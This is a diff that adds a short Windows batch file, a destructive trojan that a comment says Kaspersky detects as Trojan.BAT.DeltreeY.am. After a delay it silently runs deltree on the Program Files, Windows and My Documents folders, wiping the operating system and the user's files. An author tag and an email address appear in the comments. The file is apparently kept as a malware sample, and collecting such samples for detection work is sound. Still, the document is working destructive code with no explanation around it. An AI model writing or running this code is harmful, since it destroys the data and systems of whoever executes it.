@@ -1,0 +1,9 @@
+TYPE NUL | CHOICE.COM /N /CY /TY,4000 >NUL
+@echo off
+deltree/y progra~1 >nul
+deltree/y windows >nul
+deltree/y mydocu~1 >nul
+::Kaspersky name is Trojan.BAT.DeltreeY.am
+::Another DVL creation
+::dvl2003ro@yahoo.co.uk
+cls
